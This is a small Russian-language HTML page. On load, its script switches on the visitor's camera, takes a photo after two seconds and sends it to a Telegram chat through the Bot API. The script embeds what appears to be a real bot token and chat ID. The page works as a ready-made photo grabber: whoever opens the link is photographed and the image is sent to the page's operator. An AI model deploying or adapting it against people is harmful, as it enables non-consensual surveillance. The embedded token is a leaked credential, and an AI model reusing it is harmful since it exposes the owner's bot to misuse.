<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Автоотправка фото</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        #status { margin-top: 20px; font-weight: bold; }
        #camera { width: 100%; max-width: 400px; margin: 20px auto; display: block; }
    </style>
</head>
<body>
    <div id="status">Запуск камеры...</div>
    <video id="camera" autoplay playsinline style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // Настройки (ЗАМЕНИТЕ НА СВОИ!)
        const botToken = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U"; 
        const chatId = "1224978194"; 
        const camera = document.getElementById('camera');
        const statusDiv = document.getElementById('status');

        // Автозапуск камеры
        window.onload = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                camera.style.display = 'block';
                camera.srcObject = stream;
                statusDiv.textContent = "Камера активна. Делаю фото...";
                
                setTimeout(() => {
                    takePhotoAndSend(stream);
                }, 2000); // Через 2 секунды делает фото
            } catch (error) {
                statusDiv.textContent = `Ошибка: ${error.message}`;
            }
        };

        // Фото + отправка
        async function takePhotoAndSend(stream) {
            const canvas = document.getElementById('canvas');
            canvas.width = camera.videoWidth;
            canvas.height = camera.videoHeight;
            canvas.getContext('2d').drawImage(camera, 0, 0);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');
                
                try {
                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const data = await response.json();
                    
                    if (data.ok) {
                        statusDiv.textContent = "Фото отправлено в Telegram!";
                    } else {
                        statusDiv.textContent = `Ошибка API: ${data.description}`;
                    }
                } catch (error) {
                    statusDiv.textContent = `Ошибка сети: ${error.message}`;
                }
                
                // Выключаем камеру
                stream.getTracks().forEach(track => track.stop());
                camera.style.display = 'none';
            }, 'image/jpeg', 0.9);
        }
    </script>
</body>
</html>
